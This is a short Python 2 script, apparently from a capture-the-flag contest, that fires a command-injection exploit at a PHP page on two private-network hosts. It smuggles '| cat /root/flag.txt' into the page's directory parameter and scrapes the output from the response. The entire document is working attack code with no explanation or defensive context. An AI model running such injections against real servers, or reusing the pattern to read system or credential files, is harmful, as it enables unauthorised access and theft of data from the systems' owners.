import urllib
import re
for i in range(165,167):
    try:
        host = '192.168.112.'+str(i)
        url = 'http://'+host+'/DisplayDirectoryCtrl.php?directory=%7C+cat+%2Froot%2Fflag.txt'
        urlopen = urllib.urlopen(url).read()
        fin = re.compile("<pre>([\s\S]*?)</pre>")
        findall = re.findall(fin,urlopen)
        ym = "".join(findall)
        print host+'\n'+ym
    except:
        print host
